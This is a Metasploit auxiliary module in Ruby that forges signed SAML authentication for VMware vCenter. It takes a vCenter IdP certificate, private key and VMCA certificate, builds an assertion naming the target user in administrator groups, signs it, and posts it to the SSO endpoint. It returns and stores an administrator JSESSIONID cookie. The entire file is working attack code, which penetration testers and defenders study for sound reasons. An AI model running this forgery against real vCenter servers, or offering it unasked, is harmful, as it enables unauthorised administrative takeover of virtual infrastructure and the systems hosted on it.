##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'

PREFIX_LIST = 'xsd xsi'.freeze

NS_MAP = {
  'c14n' => 'http://www.w3.org/2001/10/xml-exc-c14n#',
  'ds' => 'http://www.w3.org/2000/09/xmldsig#',
  'saml2' => 'urn:oasis:names:tc:SAML:2.0:assertion',
  'saml2p' => 'urn:oasis:names:tc:SAML:2.0:protocol',
  'md' => 'urn:oasis:names:tc:SAML:2.0:metadata',
  'xsi' => 'http://www.w3.org/2001/XMLSchema-instance',
  'xs' => 'http://www.w3.org/2001/XMLSchema'
}.freeze

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::WmapScanUniqueQuery
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'VMware vCenter Forge SAML Authentication Credentials',
        'Description' => %q{
          This module forges valid SAML credentials for vCenter server
          using the vCenter SSO IdP certificate, IdP private key, and
          VMCA certificates as input objects; you must also  provide
          the vCenter SSO domain name and vCenter FQDN. The module will
          return a session cookie for the /ui path that grants access to
          the SSO domain as a vSphere administrator. The IdP trusted
          certificate chain can be retrieved using Metasploit post
          exploitation modules or extracted manually from
          /storage/db/vmware-vmdir/data.mdb using binwalk.
        },
        'Author' => 'npm[at]cesium137.io',
        'Platform' => [ 'linux' ],
        'DisclosureDate' => '2022-04-20',
        'SessionTypes' => [ 'meterpreter', 'shell' ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://www.horizon3.ai/compromising-vcenter-via-saml-certificates/']
        ],
        'Actions' => [
          [
            'Run',
            {
              'Description' => 'Generate vSphere session cookie'
            }
          ]
        ],
        'DefaultAction' => 'Run',
        'DefaultOptions' => {
          'USERNAME' => 'administrator',
          'DOMAIN' => 'vsphere.local',
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ IOC_IN_LOGS ]
        },
        'Privileged' => true
      )
    )

    register_options([
      OptString.new('RHOSTS', [ true, 'The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit' ]),
      OptString.new('USERNAME', [ true, 'The username to target using forged credentials', 'administrator' ]),
      OptString.new('DOMAIN', [true, 'The target vSphere SSO domain', 'vsphere.local']),
      OptString.new('VC_FQDN', [true, 'DNS FQDN of the vCenter server']),
      OptPath.new('VC_IDP_CERT', [ true, 'Path to the vCenter IdP certificate' ]),
      OptPath.new('VC_IDP_KEY', [ true, 'Path to the vCenter IdP private key' ]),
      OptPath.new('VC_VMCA_CERT', [ true, 'Path to the vCenter VMCA certificate' ])
    ])

    register_advanced_options([
      OptPort.new('RPORT', [ true, 'The target port', 443 ]),
      OptBool.new('SSL', [ false, 'Enable SSL on the connection', true ])
    ])

    deregister_options('Proxies', 'VHOST')
  end

  def rhosts
    datastore['RHOSTS']
  end

  def rport
    datastore['RPORT']
  end

  def username
    datastore['USERNAME']
  end

  def domain
    datastore['DOMAIN']
  end

  def vcenter_fqdn
    datastore['VC_FQDN']
  end

  def vc_idp_cert
    datastore['VC_IDP_CERT']
  end

  def vc_idp_key
    datastore['VC_IDP_KEY']
  end

  def vc_vmca_cert
    datastore['VC_VMCA_CERT']
  end

  def saml_ca_cert
    datastore['VCENTER_SAML_CA_CERT']
  end

  def saml_idp_cert
    datastore['VCENTER_SAML_IDP_CERT']
  end

  def saml_idp_key
    datastore['VCENTER_SAML_IDP_KEY']
  end

  def saml_id
    datastore['VCENTER_SAML_ID']
  end

  def saml_issue_instant
    datastore['VCENTER_SAML_ISSUE']
  end

  def saml_username
    datastore['VCENTER_SAML_USER']
  end

  def saml_domain
    datastore['VCENTER_SAML_DOMAIN']
  end

  def saml_response_id
    datastore['VCENTER_SAML_RESPONSE_ID']
  end

  def saml_assert_id
    datastore['VCENTER_SAML_ASSERT_ID']
  end

  def saml_idx_id
    datastore['VCENTER_SAML_IDX_ID']
  end

  def saml_not_before
    datastore['VCENTER_SAML_NOT_BEFORE']
  end

  def saml_not_after
    datastore['VCENTER_SAML_NOT_AFTER']
  end

  def saml_relay_state
    datastore['VCENTER_SAML_RELAY_STATE']
  end

  def sso_token
    datastore['VCENTER_SAML_TOKEN']
  end

  def sso_path
    datastore['VCENTER_SAML_PATH']
  end

  def ssl
    datastore['SSL']
  end

  def run
    unless validate_fqdn(vcenter_fqdn)
      print_error("Invalid vCenter FQDN provided: #{vcenter_fqdn}")
      return
    end

    unless validate_fqdn(domain)
      print_error("Invalid vCenter SSO domain provided: #{domain}")
      return
    end

    unless validate_idp_options
      print_error('Could not validate the supplied IdP trusted certificate chain')
      return
    end

    print_good('Validated vCenter Single Sign-On IdP trusted certificate chain')

    print_status('HTTP GET => /ui/login ...')
    unless init_vsphere_login
      print_error("Unable to initiate SAML login with #{rhosts}")
      return
    end

    vprint_status('Create forged SAML assertion XML ...')
    unless (vsphere_saml_response = get_saml_response_template)
      print_error('Unable to generate SAML response XML')
      return
    end

    vprint_status('Sign forged SAML assertion with IdP key ...')
    unless (vsphere_saml_auth = sign_vcenter_saml(vsphere_saml_response))
      print_error('Unable to sign SAML assertion')
      return
    end

    print_status('HTTP POST => /ui/saml/websso/sso ...')
    unless (session_cookie = submit_vcenter_auth(vsphere_saml_auth))
      print_error('Unable to acquire administrator session token')
      return
    end

    print_good('Got valid administrator session token!')
    print_good("\t#{session_cookie}")

    return true
  end

  def clear_idp_datastore
    datastore['VCENTER_SAML_IDP_CERT'] = ''
    datastore['VCENTER_SAML_IDP_KEY'] = ''
    datastore['VCENTER_SAML_CA_CERT'] = ''
  end

  def validate_idp_options
    idp_pub_b64 = nil
    idp_priv_b64 = nil
    vmca_pub_b64 = nil

    begin
      idp_cert_file = File.open(vc_idp_cert)
      idp_key_file = File.open(vc_idp_key)
      vmca_cert_file = File.open(vc_vmca_cert)

      idp_pub_b64 = idp_cert_file.read.to_s.strip!
      idp_priv_b64 = idp_key_file.read.to_s.strip!
      vmca_pub_b64 = vmca_cert_file.read.to_s.strip!
    rescue StandardError => e
      print_error("Error reading certificates (are these PEM format?): #{e.class} - #{e.message}")
      clear_idp_datastore
      return false
    ensure
      idp_cert_file.close
      idp_key_file.close
      vmca_cert_file.close
    end

    unless (ca = OpenSSL::X509::Certificate.new(vmca_pub_b64))
      print_error("Invalid VMCA certificate: #{vc_vmca_cert.path}")
      clear_idp_datastore
      return false
    end

    unless (pub = OpenSSL::X509::Certificate.new(idp_pub_b64))
      print_error("Invalid IdP certificate: #{vc_idp_cert.path}")
      clear_idp_datastore
      return false
    end

    unless (priv = OpenSSL::PKey::RSA.new(idp_priv_b64))
      print_error("Invalid IdP private key: #{vc_idp_key.path}")
      clear_idp_datastore
      return false
    end

    unless pub.check_private_key(priv)
      print_error('Provided IdP public and private keys are not associated!')
      clear_idp_datastore
      return false
    end

    unless (pub.issuer.to_s == ca.subject.to_s)
      print_error("IdP issuer DN does not match provided VMCA subject DN!\n\t  IdP Issuer DN: #{pub.issuer}\n\tVMCA Subject DN: #{ca.subject}")
      clear_idp_datastore
      return false
    end

    unless pub.verify(ca.public_key)
      print_error('Provided IdP certificate does not chain to VMCA certificate!')
      clear_idp_datastore
      return false
    end

    datastore['VCENTER_SAML_IDP_CERT'] = pub
    datastore['VCENTER_SAML_IDP_KEY'] = priv
    datastore['VCENTER_SAML_CA_CERT'] = ca

    return true
  end

  def clear_saml_datastore
    datastore['VCENTER_SAML_ID'] = ''
    datastore['VCENTER_SAML_ISSUE'] = ''
    datastore['VCENTER_SAML_USER'] = ''
    datastore['VCENTER_SAML_DOMAIN'] = ''
    datastore['VCENTER_SAML_RESPONSE_ID'] = ''
    datastore['VCENTER_SAML_ASSERT_ID'] = ''
    datastore['VCENTER_SAML_IDX_ID'] = ''
    datastore['VCENTER_SAML_NOT_BEFORE'] = ''
    datastore['VCENTER_SAML_NOT_AFTER'] = ''
    datastore['VCENTER_SAML_RELAY_STATE'] = ''
  end

  def init_vsphere_login
    clear_saml_datastore

    res = send_request_raw({
      'uri' => '/ui/login',
      'method' => 'GET'
    })

    unless res
      print_error("#{rhosts} - could not reach SAML endpoint")
      clear_saml_datastore
      return false
    end

    unless res.code == 302
      print_error("#{rhosts} - expected HTTP 302, got HTTP #{res.code}")
      clear_saml_datastore
      return false
    end

    datastore['TARGETURI'] = res['location']
    uri = target_uri

    query = queryparse(uri.query || '')

    unless (vsphere_saml_request_query = CGI.unescape(query['SAMLRequest']))
      print_error("#{rhosts} - SAMLRequest query parameter was not returned with HTTP GET")
      clear_saml_datastore
      return false
    end

    if !query['RelayState'].nil?
      datastore['VCENTER_SAML_RELAY_STATE'] = CGI.unescape(query['RelayState'])
      vprint_status("Response included RelayState: #{saml_relay_state}")
    end

    vsphere_saml_request_gz = Base64.strict_decode64(vsphere_saml_request_query)
    vsphere_saml_request = Zlib::Inflate.new(-Zlib::MAX_WBITS).inflate(vsphere_saml_request_gz)

    req = vsphere_saml_request.to_s
    doc = REXML::Document.new(req)

    datastore['VCENTER_SAML_ID'] = doc.root.attributes['ID'].strip.encode(xml: :text)
    datastore['VCENTER_SAML_ISSUE'] = doc.root.attributes['IssueInstant'].strip.encode(xml: :text)
    datastore['VCENTER_SAML_USER'] = username.strip.encode(xml: :text)
    datastore['VCENTER_SAML_DOMAIN'] = domain.strip.encode(xml: :text)
    datastore['VCENTER_SAML_RESPONSE_ID'] = SecureRandom.hex.strip.encode(xml: :text)
    datastore['VCENTER_SAML_ASSERT_ID'] = SecureRandom.uuid.strip.encode(xml: :text)
    datastore['VCENTER_SAML_IDX_ID'] = SecureRandom.hex.strip.encode(xml: :text)

    # NOT_BEFORE and NOT_AFTER are set to (now - 30 days) and (now + 30 days), respectively
    # TODO: maybe make the before/after +/- time windows a user configurable option
    datastore['VCENTER_SAML_NOT_BEFORE'] = (Time.now - 2592000).strftime('%FT%T.%3NZ').strip.encode(xml: :text)
    datastore['VCENTER_SAML_NOT_AFTER'] = (Time.now + 2592000).strftime('%FT%T.%3NZ').strip.encode(xml: :text)

    return true
  end

  def get_saml_response_template
    body = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<saml2p:Response xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\" Destination=\"https://#{rhosts}/ui/saml/websso/sso\" ID=\"_#{saml_response_id}\" InResponseTo=\"#{saml_id}\" IssueInstant=\"#{saml_issue_instant}\" Version=\"2.0\">
        <saml2:Issuer xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\">https://#{vcenter_fqdn}/websso/SAML2/Metadata/#{saml_domain}</saml2:Issuer>
        <saml2p:Status>
            <saml2p:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/>
            <saml2p:StatusMessage>Request successful</saml2p:StatusMessage>
        </saml2p:Status>
        <saml2:Assertion xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" ID=\"_#{saml_assert_id}\" IssueInstant=\"#{saml_issue_instant}\" Version=\"2.0\">
            <saml2:Issuer Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:entity\">https://#{vcenter_fqdn}/websso/SAML2/Metadata/#{saml_domain}</saml2:Issuer>
            <saml2:Subject>
                <saml2:NameID Format=\"http://schemas.xmlsoap.org/claims/UPN\">#{saml_username}@#{saml_domain}</saml2:NameID>
                <saml2:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\">
                    <saml2:SubjectConfirmationData InResponseTo=\"#{saml_id}\" NotOnOrAfter=\"#{saml_not_after}\" Recipient=\"https://#{vcenter_fqdn}/ui/saml/websso/sso\"/>
                </saml2:SubjectConfirmation>
            </saml2:Subject>
            <saml2:Conditions NotBefore=\"#{saml_not_before}\" NotOnOrAfter=\"#{saml_not_after}\">
                <saml2:ProxyRestriction Count=\"10\"/>
                <saml2:Condition xmlns:rsa=\"http://www.rsa.com/names/2009/12/std-ext/SAML2.0\" Count=\"10\" xsi:type=\"rsa:RenewRestrictionType\"/>
                <saml2:AudienceRestriction>
                    <saml2:Audience>https://#{vcenter_fqdn}/ui/saml/websso/metadata</saml2:Audience>
                </saml2:AudienceRestriction>
            </saml2:Conditions>
            <saml2:AuthnStatement AuthnInstant=\"#{saml_issue_instant}\" SessionIndex=\"_#{saml_idx_id}\" SessionNotOnOrAfter=\"#{saml_not_after}\">
                <saml2:AuthnContext>
                    <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
                </saml2:AuthnContext>
            </saml2:AuthnStatement>
            <saml2:AttributeStatement>
                <saml2:Attribute FriendlyName=\"userPrincipalName\" Name=\"http://schemas.xmlsoap.org/claims/UPN\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\">
                    <saml2:AttributeValue xsi:type=\"xsd:string\">#{saml_username}@#{saml_domain}</saml2:AttributeValue>
                </saml2:Attribute>
                <saml2:Attribute FriendlyName=\"Groups\" Name=\"http://rsa.com/schemas/attr-names/2009/01/GroupIdentity\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\">
                    <saml2:AttributeValue xsi:type=\"xsd:string\">#{saml_domain}\\Users</saml2:AttributeValue>
                    <saml2:AttributeValue xsi:type=\"xsd:string\">#{saml_domain}\\Administrators</saml2:AttributeValue>
                    <saml2:AttributeValue xsi:type=\"xsd:string\">#{saml_domain}\\CAAdmins</saml2:AttributeValue>
                    <saml2:AttributeValue xsi:type=\"xsd:string\">#{saml_domain}\\ComponentManager.Administrators</saml2:AttributeValue>
                    <saml2:AttributeValue xsi:type=\"xsd:string\">#{saml_domain}\\SystemConfiguration.BashShellAdministrators</saml2:AttributeValue>
                    <saml2:AttributeValue xsi:type=\"xsd:string\">#{saml_domain}\\SystemConfiguration.ReadOnly</saml2:AttributeValue>
                    <saml2:AttributeValue xsi:type=\"xsd:string\">#{saml_domain}\\SystemConfiguration.SupportUsers</saml2:AttributeValue>
                    <saml2:AttributeValue xsi:type=\"xsd:string\">#{saml_domain}\\SystemConfiguration.Administrators</saml2:AttributeValue>
                    <saml2:AttributeValue xsi:type=\"xsd:string\">#{saml_domain}\\LicenseService.Administrators</saml2:AttributeValue>
                    <saml2:AttributeValue xsi:type=\"xsd:string\">#{saml_domain}\\Everyone</saml2:AttributeValue>
                </saml2:Attribute>
                <saml2:Attribute FriendlyName=\"Subject Type\" Name=\"http://vmware.com/schemas/attr-names/2011/07/isSolution\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\">
                    <saml2:AttributeValue xsi:type=\"xsd:string\">false</saml2:AttributeValue>
                </saml2:Attribute>
                <saml2:Attribute FriendlyName=\"surname\" Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/surname\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\">
                    <saml2:AttributeValue xsi:type=\"xsd:string\">#{saml_domain}</saml2:AttributeValue>
                </saml2:Attribute>
                <saml2:Attribute FriendlyName=\"givenName\" Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\">
                    <saml2:AttributeValue xsi:type=\"xsd:string\">#{saml_username}</saml2:AttributeValue>
                </saml2:Attribute>
            </saml2:AttributeStatement>
        </saml2:Assertion>
    </saml2p:Response>".gsub("\n", '').gsub(/>\s*/, '>').gsub(/\s*</, '<')
    return body
  end

  def sign_vcenter_saml(xml)
    xmldoc = Nokogiri::XML(xml) do |config|
      config.options = Nokogiri::XML::ParseOptions::STRICT | Nokogiri::XML::ParseOptions::NONET
    end

    ds_element = REXML::Element.new('ds:Signature').add_namespace('ds', NS_MAP['ds'])
    ds_sig_element = ds_element.add_element('ds:SignedInfo')
    ds_sig_element.add_element('ds:CanonicalizationMethod', { 'Algorithm' => NS_MAP['c14n'] })
    ds_sig_element.add_element('ds:SignatureMethod', { 'Algorithm' => 'http://www.w3.org/2001/04/xmldsig-more#rsa-sha256' })
    ds_ref_element = ds_sig_element.add_element('ds:Reference', { 'URI' => "#_#{saml_assert_id}" })
    ds_tx_element = ds_ref_element.add_element('ds:Transforms')
    ds_tx_element.add_element('ds:Transform', { 'Algorithm' => 'http://www.w3.org/2000/09/xmldsig#enveloped-signature' })
    ds_c14_element = ds_tx_element.add_element('ds:Transform', { 'Algorithm' => NS_MAP['c14n'] })
    ds_c14_element.add_element('ec:InclusiveNamespaces', { 'xmlns:ec' => NS_MAP['c14n'], 'PrefixList' => PREFIX_LIST })
    ds_ref_element.add_element('ds:DigestMethod', { 'Algorithm' => 'http://www.w3.org/2001/04/xmlenc#sha256' })

    inclusive_namespaces = PREFIX_LIST.split(' ')
    dest_node = xmldoc.at_xpath('//saml2p:Response/saml2:Assertion', NS_MAP)
    canon_doc = dest_node.canonicalize(Nokogiri::XML::XML_C14N_EXCLUSIVE_1_0, inclusive_namespaces)

    digest_b64 = Base64.strict_encode64(OpenSSL::Digest::SHA256.digest(canon_doc))
    ds_ref_element.add_element('ds:DigestValue').text = digest_b64

    noko_sig_element = Nokogiri::XML(ds_element.to_s) do |config|
      config.options = Nokogiri::XML::ParseOptions::STRICT | Nokogiri::XML::ParseOptions::NONET
    end

    noko_signed_info_element = noko_sig_element.at_xpath('//ds:Signature/ds:SignedInfo', NS_MAP)
    c14n_string = noko_signed_info_element.canonicalize(Nokogiri::XML::XML_C14N_EXCLUSIVE_1_0)

    signature = Base64.strict_encode64(saml_idp_key.sign('rsa-sha256', c14n_string))
    ds_element.add_element('ds:SignatureValue').text = signature

    key_info_element = ds_element.add_element('ds:KeyInfo')

    x509_element = key_info_element.add_element('ds:X509Data')
    x509_cert_element = x509_element.add_element('ds:X509Certificate')
    x509_cert_element.text = Base64.strict_encode64(saml_idp_cert.to_der)

    x509_element = key_info_element.add_element('ds:X509Data')
    x509_cert_element = x509_element.add_element('ds:X509Certificate')
    x509_cert_element.text = Base64.strict_encode64(saml_ca_cert.to_der)

    noko_signed_signature_element = Nokogiri::XML(ds_element.to_s) do |config|
      config.options = Nokogiri::XML::ParseOptions::STRICT | Nokogiri::XML::ParseOptions::NONET
    end

    xmldoc.at_xpath('//saml2:Assertion/saml2:Issuer', NS_MAP).add_next_sibling(noko_signed_signature_element.document.root.to_s)

    signed_assertion = xmldoc.document.to_s.strip.gsub("\r\n", '').gsub("\n", '').gsub(/>\s*/, '>').gsub(/\s*</, '<')
    return signed_assertion
  end

  def submit_vcenter_auth(xml)
    saml_response = Base64.strict_encode64(xml)

    if saml_relay_state
      res = send_request_cgi({
        'uri' => '/ui/saml/websso/sso',
        'method' => 'POST',
        'vars_post' => {
          'SAMLResponse' => saml_response,
          'RelayState' => saml_relay_state
        }
      })
    else
      res = send_request_cgi({
        'uri' => '/ui/saml/websso/sso',
        'method' => 'POST',
        'vars_post' => {
          'SAMLResponse' => saml_response
        }
      })
    end

    unless res
      print_error("#{rhosts} - could not reach SAML endpoint")
      return false
    end

    unless res.code == 302
      print_error("#{rhosts} - expected HTTP 302, got HTTP #{res.code}")
      if res.body.to_s != ''
        res_detail = extract_response_code(res.body.to_s.strip.gsub("\r\n", '').gsub("\n", '').gsub(/>\s*/, '>').gsub(/\s*</, '<'))
        unless res_detail
          print_error("Unable to interpret response from vCenter. Raw response:\n#{res}")
          return false
        end
        print_error("Response: #{res_detail}")
        return false
      end
    end

    datastore['VCENTER_SAML_TOKEN'] = res.get_cookies_parsed.values.select { |v| v.to_s.include?('JSESSIONID') }.first.first
    datastore['VCENTER_SAML_PATH'] = res.get_cookies_parsed.values.select { |v| v.to_s.include?('Path') }.first.first

    session_cookie = "JSESSIONID=#{sso_token}; Path=#{sso_path}"

    unless save_saml_credential
      vprint_error('Unable to save credential to DB')
    end

    return session_cookie
  end

  def extract_response_code(body)
    error_start = '<div class="error-message">'
    error_end = '</div>'
    res_detail = body[/#{error_start}(.*?)#{error_end}/m, 1]
    return res_detail
  end

  def validate_fqdn(fqdn)
    fqdn_regex = /(?=^.{4,253}$)(^((?!-)[a-zA-Z0-9-]{0,62}[a-zA-Z0-9]\.)+[a-zA-Z]{2,63}$)/
    return true if fqdn_regex.match?(fqdn.to_s.downcase)

    return false
  end

  def save_saml_credential
    service_data = {
      address: Rex::Socket.getaddress(rhosts),
      port: rport,
      service_name: (ssl ? 'https' : 'http'),
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      realm_key: Metasploit::Model::Realm::Key::WILDCARD,
      realm_value: domain,
      username: "JSESSIONID (#{sso_path})",
      private_type: :password,
      private_data: sso_token
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data)
    }.merge(service_data)

    create_credential_login(login_data)
  end
end
